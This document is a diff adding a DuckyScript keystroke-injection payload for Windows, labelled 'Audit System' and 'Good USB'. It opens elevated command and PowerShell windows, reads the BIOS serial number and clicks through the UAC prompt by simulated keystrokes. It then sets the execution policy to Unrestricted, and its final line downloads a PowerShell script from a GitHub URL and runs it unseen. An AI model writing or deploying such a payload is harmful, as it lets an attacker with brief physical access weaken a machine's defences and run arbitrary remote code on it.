@@ -1,0 +1,80 @@
+REM ###########################################################
+REM #                                                         |
+REM # Title        : Audit System 	                      |
+REM # Author       : Dyl                                      |
+REM # Version      : 1.0                                      |
+REM # Category     : Good USB                                 |
+REM # Target       : Windows                                  |
+REM #                                                         |
+REM ###########################################################
+DELAY 500
+GUI r
+DELAY 400
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 750
+LEFT
+DELAY 100
+ENTER
+DELAY 1000
+STRING wmic bios get serialnumber
+DELAY 500
+ENTER
+DELAY 250
+SHIFT UP
+DELAY 200
+SHIFT UP
+DELAY 200
+SHIFT UP
+DELAY 200
+SHIFT UP
+DELAY 200
+ENTER
+DELAY 250
+GUI r
+DELAY 500
+STRING notepad
+DELAY 250
+ENTER
+DELAY 750
+CTRL v
+DELAY 100
+SHIFT UP
+BACKSPACE
+DELAY 100
+UP
+DELAY 50
+UP
+DELAY 100
+SHIFT DOWN
+DELAY 50
+CTRL c
+DELAY 100
+CTRL a
+DELAY 200
+CTRL v
+DELAY 250
+GUI r
+DELAY 100
+STRING powershell Start-Process powershell -Verb runAs
+CTRL-SHIFT ENTER
+DELAY 1000
+SHIFT TAB
+DELAY 500
+ENTER
+DELAY 5000
+STRING Set-ExecutionPolicy Unrestricted
+DELAY 200
+ENTER
+DELAY 1000
+STRING A
+ENTER
+DELAY 1000
+STRING Y
+DELAY 100
+ENTER
+DELAY 1000
+STRING $url = 'https://raw.githubusercontent.com/Ginnipig16/Flipper/main/SQL_Domain.ps1'; $localFilePath = 'C:\\Users\\SQL_queryv2.ps1'; (New-Object System.Net.WebClient).DownloadFile($url, $localFilePath); & $localFilePath
+DELAY 200
+ENTER
+DELAY 60000
